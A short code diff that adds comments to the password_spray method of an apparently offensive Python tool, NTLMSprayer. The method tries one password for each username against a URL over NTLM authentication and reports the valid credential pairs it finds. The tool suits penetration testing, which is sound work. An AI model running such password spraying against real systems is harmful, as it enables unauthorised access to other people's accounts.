@@ -22,9 +22,13 @@ class NTLMSprayer:
 
     def password_spray(self, password, url):
         print("[*] Starting passwords spray attack using the following password: " + password)
+        # Reset valid credential counter
         count = 0
+        # Iterate through all the possible usernames
         for user in self.users:
+            # Make a request to the website and attempt Windows Authentication
             response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
+            # Read status code of response to determine if authentication was successful
             if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                 print("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                 count += 1
